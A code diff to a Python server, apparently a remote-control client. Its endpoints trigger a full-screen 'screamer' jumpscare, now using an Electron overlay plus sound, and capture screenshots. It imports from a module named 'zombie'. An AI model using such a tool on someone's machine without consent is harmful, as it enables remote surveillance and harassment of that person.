@@ -16,6 +16,7 @@ from zombie import send_request
 import random
 import platform
 from plyer import notification
+import time
 
 # --- Asset paths ---
 ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
@@ -43,6 +44,10 @@ def show_fullscreen_image(image_path):
 def display_screamer():
     song = AudioSegment.from_mp3(SOUND_PATH)
     play(song)
+
+def launch_electron_screamer():
+    electron_dir = os.path.join(os.path.dirname(__file__), '..', 'electron_screamer')
+    subprocess.Popen(['npm', 'start'], cwd=electron_dir)
 
 connected_websockets = set()
 ws_lock = threading.Lock()
@@ -192,7 +197,9 @@ def get_system():
 
 @app.get('/screamer')
 def trigger_screamer():
-    display_screamer()
+    launch_electron_screamer()  # pour l'overlay image
+    time.sleep(1)
+    display_screamer()  # pour le son
     return {"status": "screamer triggered"}
 
 @app.get('/screenshot')
